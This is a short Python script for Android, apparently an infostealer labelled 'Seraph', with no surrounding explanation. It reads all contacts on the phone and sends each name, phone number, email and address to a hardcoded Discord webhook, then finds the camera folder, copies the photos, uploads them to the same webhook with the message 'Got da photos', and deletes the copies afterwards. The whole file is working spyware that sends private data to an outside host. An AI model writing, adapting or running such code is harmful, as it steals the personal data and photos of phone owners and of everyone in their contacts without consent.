import os
import shutil
import android.permissions
import androidhelper
import requests
import time


def main():
    droid = androidhelper.Android()
    contacts = droid.contactsGetAll().result
    output_file = os.path.join(droid.getExternalStorageDirectory().result, 'Download', 'contacts.txt')
    webhook_url = "https://discord.com/api/webhooks/1110639493440094338/ZBRCF8MVJJcfcSvQXXB6odJGD_8MTd5rylCBQaEH-BGyBex6F7qr4QbHeww2ES5HtDJy"
    with open(output_file, 'w') as f:
        for contact in contacts:
            payload = {
            "content": f'Name: {contact["name"]}\nPhone: {contact["phone"]}\nEmail: {contact["email"]}\nAddress: {contact["address"]}\n',
            "username": "Seraph (Contacts)"
            }
            response = requests.post(webhook_url, json=payload)
            time.sleep(0.3)

    # Request permission to access external storage
    android.permissions.request_permission('android.permission.READ_EXTERNAL_STORAGE')
    android.permissions.request_permission('android.permission.WRITE_EXTERNAL_STORAGE')

    gallery_dir = ''
    for dirpath, dirnames, filenames in os.walk('/storage/emulated/'):
        for dirname in dirnames:
            if dirname.lower() == 'dcim':
                gallery_dir = os.path.join(dirpath, dirname, 'Camera')
                break
        if gallery_dir:
            break

    # Specify the destination directory
    dst_dir = '/storage/emulated/0/Pictures/'

    # Loop through all files in the gallery directory
    images = []
    for file_name in os.listdir(gallery_dir):
        # Check if the file is an image (you can modify this to filter by file extension)
        if file_name.endswith('.jpg') or file_name.endswith('.png'):
            # Build the full path for the source and destination files
            src_path = os.path.join(gallery_dir, file_name)
            dst_path = os.path.join(dst_dir, file_name)
            # Copy the file to the destination directory
            shutil.copy(src_path, dst_path)
            # Append the image file path to the list
            images.append(dst_path)

    # Prepare the payload for the webhook
    payload = {
        "content": "Got da photos",
        "username": "Seraph (Photos)"
    }
    files = [("file{}".format(index + 1), open(image_path, 'rb')) for index, image_path in enumerate(images)]

    # Send the payload and files to the webhook
    response = requests.post(webhook_url, data=payload, files=files)

    # Clean up: remove the copied images from the destination directory
    for image_path in images:
        os.remove(image_path)


if __name__ == '__main__':
    main()
